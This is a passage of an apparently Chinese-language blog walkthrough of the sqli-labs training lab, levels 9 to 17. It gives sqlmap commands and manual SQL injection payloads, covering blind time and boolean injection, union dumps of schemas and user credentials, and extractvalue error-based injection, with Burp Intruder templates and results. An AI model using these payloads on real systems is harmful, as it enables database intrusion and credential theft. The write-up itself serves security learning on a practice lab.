+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure>
+<p>利用 if () 函数进行时间盲注，发现闭合单引号的时候它就一直睡觉咯</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure>
+<p>和布尔盲注类似，但是是根据服务器响应的时间长短进行判断了，开干</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure>
+<p>判断出 database () 的长度是 8 个字符，还是接着上 bp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),§1§,1))=§115§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>
+<p>bp 的 result，根据 ascii 值就可以吧当前数据名弄出来了：</p>
+<table>
+<thead>
+<tr>
+<th>request</th>
+<th>payload1</th>
+<th>payload2</th>
+<th>status</th>
+<th>timeout</th>
+<th>error</th>
+<th>length</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td></td>
+<td></td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>787</td>
+<td>3</td>
+<td>99</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>802</td>
+<td>2</td>
+<td>101</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>838</td>
+<td>6</td>
+<td>105</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>909</td>
+<td>5</td>
+<td>114</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>913</td>
+<td>1</td>
+<td>115</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>927</td>
+<td>7</td>
+<td>116</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>932</td>
+<td>4</td>
+<td>117</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>968</td>
+<td>8</td>
+<td>121</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>988</td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>951</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>2</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>951</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>3</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>951</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>4</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>951</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="总结-9"><a class="markdownIt-Anchor" href="#总结-9">#</a> 总结</h2>
+<p>其实想节省时间可以去看数据库的命名规范，确定要测试的字符有哪些，这样在进行大量数据测试的时候会节省一些时间</p>
+<hr>
+<h1 id="less-10"><a class="markdownIt-Anchor" href="#less-10">#</a> Less-10</h1>
+<p>date：2020-11-21 15:55:10</p>
+<h2 id="过程-10"><a class="markdownIt-Anchor" href="#过程-10">#</a> 过程</h2>
+<h3 id="sqlmap-10"><a class="markdownIt-Anchor" href="#sqlmap-10">#</a> sqlmap</h3>
+<p>同 less-1</p>
+<h3 id="手工注入-10"><a class="markdownIt-Anchor" href="#手工注入-10">#</a> 手工注入</h3>
+<p>和 less-9 相比就是单引号闭合变成了双引号闭合</p>
+<p>用这个 payload，服务器就睡觉啦：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure>
+<p>后面的流程和 less-9 一样</p>
+<h2 id="总结-10"><a class="markdownIt-Anchor" href="#总结-10">#</a> 总结</h2>
+<p>遇到这个题目也不知道是该开心还是该开心</p>
+<hr>
+<h1 id="less-11"><a class="markdownIt-Anchor" href="#less-11">#</a> Less-11</h1>
+<p>date：2020-11-21 16:23:25</p>
+<h2 id="过程-11"><a class="markdownIt-Anchor" href="#过程-11">#</a> 过程</h2>
+<p>写完时间盲注的我，看见这道题目，眼前一亮！终于换题目啦哈哈哈哈哈哈哈嗝</p>
+<h3 id="sqlmap-11"><a class="markdownIt-Anchor" href="#sqlmap-11">#</a> sqlmap</h3>
+<p>sqlmap 测 post 请求可以用参数 forms</p>
+<p>这里用的–forms 参数，直接搞到所有数据库了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后面爆字段值改参数就可以了，同 less-1</p>
+<h3 id="手工注入-11"><a class="markdownIt-Anchor" href="#手工注入-11">#</a> 手工注入</h3>
+<p>看见登录框就想 admin/123456 登录（竟然失败了！气人！）</p>
+<p>抓包看见的是 post 请求，所以不能和之前一样直接在 url 后面接参数了，那就在输入框直接注入哈哈哈</p>
+<p>payload，username 最后面有个空格，不加空格注释符号和后面的符号连接在一起，就起不到注释的功能啦:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>
+<p>有数据回显，舒服了</p>
+<p>上 bp 抓包，直接改后面的参数，根据 order by 确定需要两个字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出，竟然真的有一个 admin/admin…：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>爆数据库 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>爆表 payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure>
+<p>爆字段:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>爆字段值:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure>
+<p>后面的都是常规操作了</p>
+<h2 id="总结-11"><a class="markdownIt-Anchor" href="#总结-11">#</a> 总结</h2>
+<p>sqlmap 测 post 请求可以用参数 forms，直接获取表单，可以使用 - r 参数读取请求文件，或者通过–data 参数测试，具体情况具体百度</p>
+<p>-r 读取的文件可以用 bp 抓包，右键 copy to file，直接导出 txt 文件</p>
+<hr>
+<h1 id="less-12"><a class="markdownIt-Anchor" href="#less-12">#</a> Less-12</h1>
+<h2 id="过程-12"><a class="markdownIt-Anchor" href="#过程-12">#</a> 过程</h2>
+<p>date：2020-11-21 17:21:22</p>
+<h3 id="sqlmap-12"><a class="markdownIt-Anchor" href="#sqlmap-12">#</a> sqlmap</h3>
+<p>同 less-11</p>
+<h3 id="手工注入-12"><a class="markdownIt-Anchor" href="#手工注入-12">#</a> 手工注入</h3>
+<p>上 bp 抓包</p>
+<p>发现双引号报错，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>我？？？</p>
+<p>生气的乱搞了:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>这下出来了把，后面是 &quot;)，再加个括号闭合一下下，分别 order by2 和 3，确定是两个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出当前数据库～</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>后续操作参考 less-11</p>
+<h2 id="总结-12"><a class="markdownIt-Anchor" href="#总结-12">#</a> 总结</h2>
+<p>和上一关比就是单引号闭合变成 &quot;) 闭合了，和前面十关做的题目一样呀，后面不会还是一样的吧，然后写完盲注就没了把</p>
+<p>唉，我觉得我的专注力有点不太够，才写了几道题啊，还花了这么长时间，真是废物</p>
+<hr>
+<h1 id="less-13"><a class="markdownIt-Anchor" href="#less-13">#</a> Less-13</h1>
+<p>date：2020-11-21 18:08:01</p>
+<h2 id="过程-13"><a class="markdownIt-Anchor" href="#过程-13">#</a> 过程</h2>
+<h3 id="sqlmap-13"><a class="markdownIt-Anchor" href="#sqlmap-13">#</a> sqlmap</h3>
+<p>同 less-11</p>
+<h3 id="手工注入-13"><a class="markdownIt-Anchor" href="#手工注入-13">#</a> 手工注入</h3>
+<p>盲猜这题是 ')) 闭合，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>哦豁，是 ') 闭合，生气！闭合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出只有一张图片，表示闭合成功，没有数据回显</p>
+<p>那就用报错来看数据呗，正好报错注入的函数我用的少</p>
+<p>extractvalue (目标 xml 文档，xml 路径) 用于查询 xml 文件</p>
+<p>第二个参数 xml 中的位置是可操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx/… 这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出得到当前数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure>
+<p>拿别的数据在 xml 路径那里改 payload 即可，参考 less-11</p>
+<h2 id="总结-13"><a class="markdownIt-Anchor" href="#总结-13">#</a> 总结</h2>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种 sql 报错注入姿势总结</a></p>
+<hr>
+<h1 id="less-14"><a class="markdownIt-Anchor" href="#less-14">#</a> Less-14</h1>
+<p>date：2020-11-21 19:47:21</p>
+<h2 id="过程-14"><a class="markdownIt-Anchor" href="#过程-14">#</a> 过程</h2>
+<h3 id="sqlmap-14"><a class="markdownIt-Anchor" href="#sqlmap-14">#</a> sqlmap</h3>
+<p>同 less-11</p>
+<h3 id="手工注入-14"><a class="markdownIt-Anchor" href="#手工注入-14">#</a> 手工注入</h3>
+<p>直接双引号闭合了，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+<p>能闭合了就随便用之前的哪个方法拿数据都可以啦，用报错注入拿个数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>
+<p>别的同 Less-11</p>
+<h2 id="总结-14"><a class="markdownIt-Anchor" href="#总结-14">#</a> 总结</h2>
+<p>这，没啥</p>
+<hr>
+<h1 id="less-15"><a class="markdownIt-Anchor" href="#less-15">#</a> Less-15</h1>
+<p>date：2020-11-21 20:03:27</p>
+<h2 id="过程-15"><a class="markdownIt-Anchor" href="#过程-15">#</a> 过程</h2>
+<h3 id="sqlmap-15"><a class="markdownIt-Anchor" href="#sqlmap-15">#</a> sqlmap</h3>
+<p>同 less-11</p>
+<h3 id="手工注入-15"><a class="markdownIt-Anchor" href="#手工注入-15">#</a> 手工注入</h3>
+<p>看标题，布尔盲注，行叭，上 bp 抓包</p>
+<p>单引号闭合后接 order by 2，给的是 flag.jpg</p>
+<p>接 order by 2，给的是 slap.jpg</p>
+<p>明显 flag.jpg 的就是登陆成功嘛</p>
+<p>说明单引号闭合成功且需要的是两个字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>还是先利用 if 判断，把数据库名字长度搞出来，利用一下 payload，服务器沉睡了好一会才醒来，那么长度就是 8 啦！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>一个一个字符猜，这种搬砖的活还是交给 bp 把</p>
+<p>右键 send to Intruder，attack type 选 cluster bomb:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),§1§,1))=§8§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>
+<table>
+<thead>
+<tr>
+<th>request</th>
+<th>payload1</th>
+<th>payload2</th>
+<th>status</th>
+<th>timeout</th>
+<th>error</th>
+<th>length</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>787</td>
+<td>3</td>
+<td>99</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>802</td>
+<td>2</td>
+<td>101</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>838</td>
+<td>6</td>
+<td>105</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>909</td>
+<td>5</td>
+<td>114</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>913</td>
+<td>1</td>
+<td>115</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>927</td>
+<td>7</td>
+<td>116</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>932</td>
+<td>4</td>
+<td>117</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>968</td>
+<td>8</td>
+<td>121</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1691</td>
+<td></td>
+</tr>
+<tr>
+<td>0</td>
+<td></td>
+<td></td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1737</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>2</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1737</td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1737</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>3</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1737</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="总结-15"><a class="markdownIt-Anchor" href="#总结-15">#</a> 总结</h2>
+<hr>
+<h1 id="less-16"><a class="markdownIt-Anchor" href="#less-16">#</a> Less-16</h1>
+<p>date：2020-11-21 22:33:47</p>
+<h2 id="过程-16"><a class="markdownIt-Anchor" href="#过程-16">#</a> 过程</h2>
+<h3 id="sqlmap-16"><a class="markdownIt-Anchor" href="#sqlmap-16">#</a> sqlmap</h3>
+<p>同 less-11</p>
+<h3 id="手工注入-16"><a class="markdownIt-Anchor" href="#手工注入-16">#</a> 手工注入</h3>
+<p>username 输入 <code>admin&quot;) or 1=1 -- </code> 直接登录成功，不要忘记–后面的空格哈</p>
+<p>因为可以根据图片的显示判断，所以其实时间盲注还是布尔盲注都是可以的呀，只是前面那道题用过布尔盲注了，这里就用时间盲注</p>
+<p>老规矩先判断数据库长度是 8：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure>
+<p>然后搬砖找 bp，send to Intruder：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),§1§,1))=§8§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>
+<table>
+<thead>
+<tr>
+<th>request</th>
+<th>payload1</th>
+<th>payload2</th>
+<th>status</th>
+<th>timeout</th>
+<th>error</th>
+<th>length</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>787</td>
+<td>3</td>
+<td>99</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>802</td>
+<td>2</td>
+<td>101</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>838</td>
+<td>6</td>
+<td>105</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>909</td>
+<td>5</td>
+<td>114</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>913</td>
+<td>1</td>
+<td>115</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>927</td>
+<td>7</td>
+<td>116</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>932</td>
+<td>4</td>
+<td>117</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>968</td>
+<td>8</td>
+<td>121</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1712</td>
+<td></td>
+</tr>
+<tr>
+<td>0</td>
+<td></td>
+<td></td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1749</td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>1749</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="总结-16"><a class="markdownIt-Anchor" href="#总结-16">#</a> 总结</h2>
+<p>bp 真好，sqlmap 真好，搬砖真难</p>
+<hr>
+<h1 id="less-17sqlmaping"><a class="markdownIt-Anchor" href="#less-17sqlmaping">#</a> Less-17（sqlmaping）</h1>
+<p>date：2020-11-21 22:54:56</p>
+<h2 id="过程-17"><a class="markdownIt-Anchor" href="#过程-17">#</a> 过程</h2>
+<p>看见题目又开心了起来，不是盲注啦</p>
+<h3 id="sqlmap-17"><a class="markdownIt-Anchor" href="#sqlmap-17">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 17.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-17"><a class="markdownIt-Anchor" href="#手工注入-17">#</a> 手工注入</h3>
+<p>username 输入 <code>admin' or 1=1 -- </code></p>
+<p>竟然返回 bug off，you silly dump hacker</p>
+<p>哦豁，骂我，我要干你，等着</p>
+<p>我怀疑后台判断了用户输入，然后无数次尝试无数次被骂，我决定偷偷看一下源码</p>
+<p>源码中对 uname 限制了只能 15 个字符，单是这个就已经很无力了，后来看完源码才发现这是一个重置密码的表单，而且源码中并没有对 passwd 做限制</p>
+<p>眼瞎的我决定用时间盲注，bp send to repeater：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>哈哈 服务器睡着啦，随后时间盲注就可以了，和上面的题目一样</p>
+<h2 id="总结-17"><a class="markdownIt-Anchor" href="#总结-17">#</a> 总结</h2>
+<p>感觉用得多的还是盲注</p>
